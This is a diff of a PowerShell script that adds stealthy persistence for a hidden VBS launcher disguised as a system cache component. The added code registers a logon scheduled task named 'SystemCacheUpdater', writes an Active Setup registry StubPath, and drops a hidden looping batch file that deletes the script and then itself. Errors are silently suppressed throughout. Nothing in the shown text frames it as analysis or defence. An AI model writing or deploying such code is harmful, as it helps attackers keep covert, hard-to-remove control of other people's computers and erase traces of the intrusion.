@@ -70,9 +70,23 @@ try {
     Start-Process -WindowStyle Hidden -FilePath "$dest\system_cache_launcher.vbs"
 } catch {}
 
-# Self-delete
-Start-Sleep -Seconds 2
-$me = $MyInvocation.MyCommand.Path
+# Task Scheduler (as fallback/autostart)
 try {
-    Remove-Item $me -Force
+    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$dest\system_cache_launcher.vbs`""
+    $Trigger = New-ScheduledTaskTrigger -AtLogOn
+    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive
+    Register-ScheduledTask -TaskName "SystemCacheUpdater" -Action $Action -Trigger $Trigger -Principal $Principal -Description "System Cache Task" -Force
 } catch {}
+
+# Optional: Active Setup
+try {
+    New-Item -Path "HKLM:\Software\Microsoft\Active Setup\Installed Components\{GUID}" -Force | Out-Null
+    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Active Setup\Installed Components\{GUID}" `
+        -Name "StubPath" -Value "wscript.exe `"$dest\system_cache_launcher.vbs`""
+} catch {}
+
+# Self-delete
+$me = $MyInvocation.MyCommand.Path
+$bat = "$env:TEMP\delme.bat"
+Set-Content -Path $bat -Value "@echo off`r`n:Repeat`r`ndel `"$me`"`r`nif exist `"$me`" goto Repeat`r`ndel %0" -Encoding ASCII
+Start-Process -WindowStyle Hidden -FilePath $bat
